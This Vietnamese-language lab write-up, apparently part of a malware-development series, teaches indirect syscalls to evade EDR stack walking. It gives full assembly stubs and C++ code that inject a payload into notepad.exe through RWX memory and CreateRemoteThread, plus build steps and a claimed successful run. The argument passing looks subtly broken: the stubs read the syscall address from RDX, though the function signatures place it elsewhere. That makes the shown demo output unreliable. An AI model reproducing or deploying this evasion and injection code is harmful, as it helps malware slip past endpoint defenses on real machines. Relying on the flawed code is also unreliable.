
---

# 📝 [PE 25] Indirect Syscalls (Advanced Stack Walking Bypass)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Indirect Syscalls** là giải thuật né tránh phòng thủ động (Dynamic Evasion) ở cấp độ kiến trúc vi xử lý nâng cao, được thiết kế để vô hiệu hóa cơ chế trinh sát vết dấu ngăn xếp (**Stack Walking / Call Stack Trace Protection**) của các giải pháp AV/EDR hiện đại.

Khi sử dụng Direct Syscalls (`PE 24`), mặc dù bypass được User-mode Hook, lệnh gọi `syscall` lại được kích nổ trực tiếp từ phân đoạn `.text` của Loader. EDR chỉ cần thực hiện kỹ thuật kiểm tra ngược dòng (Stack Walking) khi có một luồng nhạy cảm kích hoạt, nếu phát hiện lệnh `syscall` không xuất phát từ thư viện `ntdll.dll` hợp pháp, hệ thống phòng thủ sẽ chặn đứng hành vi.

Lab PE 25 bẻ gãy bộ lọc này bằng chiến thuật **Mượn lệnh nhảy gián tiếp (Indirect Execution)**. Ta tự nạp mã số hiệu hệ thống, nhưng mượn chính tọa độ của một chỉ mục lệnh `syscall` hợp pháp đang sống inside lòng `ntdll.dll` để phát lệnh xuống Kernel-mode, hợp thức hóa hoàn toàn dòng chảy tháp luồng.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa 100% cơ chế kiểm tra vết ngăn xếp (`Call Stack Trace Validation`) và thuộc tính trang nhớ của EDR.
* Làm chủ kỹ nghệ tìm kiếm tọa độ byte máy thực thi động (`Asm Opcode Hunting`) chéo biên giới RAM.
* Tích hợp thành công hợp ngữ x64 (`.asm`) kết hợp con trỏ địa chỉ gián tiếp trên Microsoft Visual Studio.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Khi một hàm Native API trong `ntdll.dll` được Unhook phẳng sạch, cấu trúc byte máy của nó sẽ kết thúc bằng cặp bài trùng lệnh:

```assembly
syscall
ret

```

Giải thuật của Lab PE 25 bóc tách bản đồ RAM và thực hiện lệnh gọi gián tiếp qua quy trình toán học ngầm 4 bước sau:

```
[ Loader bới ntdll.dll ] ──> [ Trích xuất SSN + Tọa độ byte 'syscall' ] ──> [ Nạp SSN vào EAX ] ──> [ JMP thẳng vào ô nhớ 'syscall' inside ntdll ]

```

1. **Săn lùng địa chỉ Syscall hợp pháp**: Loader quét phân đoạn `.text` của `ntdll.dll` trên bộ nhớ ảo, phân giải độ rộng byte để bốc tách chính xác:
* Số hiệu dịch vụ hệ thống (**SSN**) cần gọi gán vào thanh ghi `EAX`.
* Địa chỉ ô nhớ tuyệt đối thực tế chứa byte mã máy `0x0F 0x05` (tương ứng lệnh `syscall`) nằm inside lòng Module `ntdll.dll`.


2. **Ngụy trang tháp ngăn xếp (Indirect Execution Stub)**: Thay vì dùng lệnh `syscall` cục bộ, cấu trúc hợp ngữ của ta thực hiện lệnh **`jmp rax`** (hoặc `jmp r11`) trỏ thẳng vào tọa độ đã săn được ở bước 1.
3. **Bypass cơ chế Stack Walking**: Khi CPU thực hiện lệnh nhảy sang `ntdll.dll` và kích nổ lệnh `syscall` tại đó, đối với nhân Kernel, cuộc chuyển giao từ Ring 3 xuống Ring 0 này hoàn toàn hợp lệ vì điểm phát lệnh nằm lọt lòng inside một Module được Microsoft ký số bảo an tối cao, che giấu dấu vết Loader hoàn hảo.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa tính toán Offset và địa chỉ Syscall động để đạt độ ẩn mình kịch trần.

### 📜 Bước 3.1: Tạo tệp hợp ngữ hạ tầng `IndirectStubs.asm`

```assembly
.code

; Nguyên mẫu luồng gọi gián tiếp cho NtAllocateVirtualMemory
ZwIndirectAllocateVirtualMemory proc
    mov r10, rcx
    mov eax, 18h            ; SSN của NtAllocateVirtualMemory trên Win10/11 x64
    mov r11, rdx            ; rdx nắm giữ địa chỉ ô nhớ 'syscall' inside ntdll do main truyền sang
    jmp r11                 ; KÍCH NỔ GIÁN TIẾP: Nhảy thẳng vào ntdll để phát lệnh syscall!
    ret
ZwIndirectAllocateVirtualMemory endp

; Nguyên mẫu luồng gọi gián tiếp cho NtWriteVirtualMemory
ZwIndirectWriteProcessMemory proc
    mov r10, rcx
    mov eax, 3Ah            ; SSN của NtWriteVirtualMemory trên Win10/11 x64
    mov r11, rdx            ; rdx nắm giữ địa chỉ ô nhớ 'syscall' inside ntdll
    jmp r11                 ; Nhảy gián tiếp bypass Stack Walking
    ret
ZwIndirectWriteProcessMemory endp

end

```

### 📜 Bước 3.2: Tạo tệp mã nguồn chính `main.cpp`

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Khai báo liên kết ngoài tới các hàm Stub Assembly gián tiếp
extern "C" NTSTATUS ZwIndirectAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect, PVOID SyscallAddress);
extern "C" NTSTATUS ZwIndirectWriteProcessMemory(HANDLE ProcessHandle, PVOID BaseAddress, LPCVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten, PVOID SyscallAddress);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình
DWORD WINAPI RemoteIndirectPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Giải thuật săn lùng byte opcode 'syscall' (0x0F, 0x05) lọt lòng ntdll.dll
PVOID HuntForSyscallLocation(const char* apiName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PBYTE pFunctionAddress = (PBYTE)GetProcAddress(hNtdll, apiName);
    if (!pFunctionAddress) return NULL;

    // Quét tịnh tiến tối đa 32 byte lọt lòng hàm để b lần vết byte chỉ mục syscall x64
    for (int i = 0; i < 32; i++) {
        if (pFunctionAddress[i] == 0x0F && pFunctionAddress[i + 1] == 0x05) {
            return (PVOID)(pFunctionAddress + i); // Trả về tọa độ tuyệt đối của ô nhớ syscall xịn!
        }
    }
    return NULL;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 25: INDIRECT SYSCALLS STACK TRACE BYPASS" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) return EXIT_FAILURE;

    // BƯỚC 1: SĂN LÙNG TOẠ ĐỘ LỆNH SYSCALL XỊN LỌT LÒNG NTDLL.DLL
    PVOID pSyscallLocation = HuntForSyscallLocation("NtAllocateVirtualMemory");
    if (!pSyscallLocation) {
        std::cerr << "[-] Khong the san lung vi tri syscall hop phap!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] San trung vi tri lenh syscall hop phap cua OS tai: 0x" << std::hex << pSyscallLocation << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // BƯỚC 2: KÍCH NỔ CẤP PHÁT BỘ NHỚ QUA LỆNH NHẢY GIÁN TIẾP CHÉO RAM
    PVOID remoteCodeBuffer = NULL;
    SIZE_T codeSize = 500; // Cấp phát động Thích ứng vừa khít cấu trúc
    
    std::cout << "[*] Dang goi gian tiep NtAllocateVirtualMemory..." << std::endl;
    NTSTATUS status = ZwIndirectAllocateVirtualMemory(hProcess, &remoteCodeBuffer, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, pSyscallLocation);

    PVOID remoteDataBuffer = NULL;
    SIZE_T dataSize = sizeof(THREAD_DATA);
    status |= ZwIndirectAllocateVirtualMemory(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, pSyscallLocation);

    if (status != 0 || !remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] Indirect Syscall Allocation failed! Code: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Bộ nho cap phat thanh cong thong qua Indirect JMP tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // BƯỚC 3: GHI PAYLOAD GIÁN TIẾP SANG RAM NOTEPAD
    status = ZwIndirectWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteIndirectPayload, 500, NULL, pSyscallLocation);
    status |= ZwIndirectWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL, pSyscallLocation);

    if (status != 0) {
        std::cerr << "[-] Indirect Syscall Write failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da doc lap ghi ma may va tham so sang RAM doi phuong hoan toan phẳng sach." << std::endl;

    // BƯỚC 4: TRIỆU HỒI LUỒNG TỪ XA KÍCH NỔ TOÀN DIỆN CHIẾN DỊCH
    // Sử dụng Win32 API bọc ngoài ở bước cuối cùng sau khi tháp API đã được phẳng sạch hoàn toàn gỡ Hook
    std::cout << "[*] Dang thuc hien khoi tao luong CreateRemoteThread de khai hoa..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, 1000); // Gánh luồng xử lý dứt điểm phẳng sạch
        std::cout << "[+] Indirect Syscall Injection Process Completed Successfully!" << std::endl;
        CloseHandle(hThread);
    }

    // Thu hồi Handle hệ thống
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh tháp cong nghe PE 25. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

Quy trình tích hợp bộ dịch MASM cho file `.asm` tuân thủ nghiêm ngặt cờ liên kết tĩnh hệ thống độc lập:

### ⚙️ Thiết lập cấu hình Hợp ngữ (MASM):

1. Tại cửa sổ **Solution Explorer**, click chuột phải vào tên Project $\rightarrow$ Chọn **`Build Dependencies`** $\rightarrow$ Click chọn **`Build Customizations...`**
2. Tích chọn vào ô **`masm (.targets, .props)`** và nhấn `OK`.
3. Click chuột phải vào tệp tin `IndirectStubs.asm` $\rightarrow$ Chọn **`Properties`**. Tại mục `Item Type`, chuyển cấu hình sang dạng **`Microsoft Macro Assembler`** và nhấn Apply.

### ⚙️ Cấu hình liên kết tĩnh dự án Release:

1. Đặt thanh cấu hình dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Vào mục `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, thiết lập cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy mượt mà độc lập trên môi trường máy ảo VM sạch.
3. Tiến hành chọn **`Rebuild`** để kết xuất tệp tin nhị phân tối cao kịch trần kịch khung.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành:

```powershell
PS C:\Workspace\x64\Release> .\PE25_Indirect_Syscalls.exe
====================================================
[*] PE 25: INDIRECT SYSCALLS STACK TRACE BYPASS
====================================================
[+] San trung vi tri lenh syscall hop phap cua OS tai: 0x00007ffd31b8314a
[*] Dang goi gian tiep NtAllocateVirtualMemory...
[+] Bộ nho cap phat thanh cong thong qua Indirect JMP tai: 0x0000021A4B230000
[+] Da doc lap ghi ma may va tham so sang RAM doi phuong hoan toan phẳng sach.
[*] Dang thuc hien khoi tao luong CreateRemoteThread de khai hoa...
[+] Indirect Syscall Injection Process Completed Successfully!

[*] Hoan thanh tháp cong nghe PE 25. Nhan Enter de dong cua so...

```

*🎯 Hệ quả RAM tối cao:*
Ứng dụng Máy tính **`calc.exe` bật bung mở hiên ngang kịch trần kịch khung**! Toàn bộ chu kỳ sống can thiệp chéo bộ nhớ diễn ra phẳng sạch hoàn hảo. Khi EDR tiến hành Stack Walking để trinh sát vết tích luồng gọi, điểm phát lệnh `syscall` hoàn toàn khớp với địa chỉ thuộc tính `MEM_IMAGE` hợp pháp của `ntdll.dll`. Sự ngụy trang đạt mức độ tối cao, bẻ gãy hoàn toàn các cảm biến trinh sát Stack Trace nâng cao kịch khung kịch nền!

---
